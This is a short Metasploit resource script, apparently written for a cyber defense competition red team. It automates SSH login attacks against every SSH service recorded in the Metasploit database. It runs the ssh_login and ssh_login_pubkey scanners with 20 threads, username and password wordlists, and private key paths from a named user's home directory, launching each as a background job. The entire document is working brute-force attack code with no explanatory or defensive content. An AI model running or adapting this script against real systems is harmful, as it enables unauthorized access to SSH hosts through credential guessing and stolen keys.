<ruby>
# Define the SSH modules to run
modules = ["auxiliary/scanner/ssh/ssh_login","auxiliary/scanner/ssh/ssh_login_pubkey"]

# Loop the modules
modules.each do |exec|

  # Set any SSH services from the db to RHOSTS
  self.run_single("use #{exec}")
  puts("\nRunning Module #{exec}")
  self.run_single("services -c name -S ssh -R")
  self.run_single("set threads 20")
  self.run_single("setg USER_FILE cdc_linux_user.txt")
  self.run_single("set PASS_FILE cdc_linux_pass.txt")
  #self.run_single("setg KEY_PATH /home/atekippe/Tools/cdc_metasploit/fall_2018_private.key")
  self.run_single("setg KEY_PATH /home/atekippe/.ssh/test_id_rsa")
  self.run_single("exploit -j")
end

</ruby>
